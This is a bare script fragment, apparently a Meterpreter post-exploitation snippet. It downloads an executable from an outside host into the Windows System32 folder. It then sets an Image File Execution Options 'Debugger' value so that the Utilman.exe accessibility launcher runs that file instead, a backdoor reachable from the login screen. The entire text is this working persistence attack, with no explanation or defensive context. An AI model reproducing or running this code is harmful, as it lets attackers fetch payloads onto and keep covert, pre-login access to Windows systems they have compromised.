client.railgun.urlmon.URLDownloadToFileA(0,"http://192.168.1.10 /A43.exe","C:\\Windows\\System32\\a43.exe",0,0)
key="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe"
syskey=registry_createkey(key)
registry_setvaldata(key,'Debugger','a43.exe','REG_SZ')
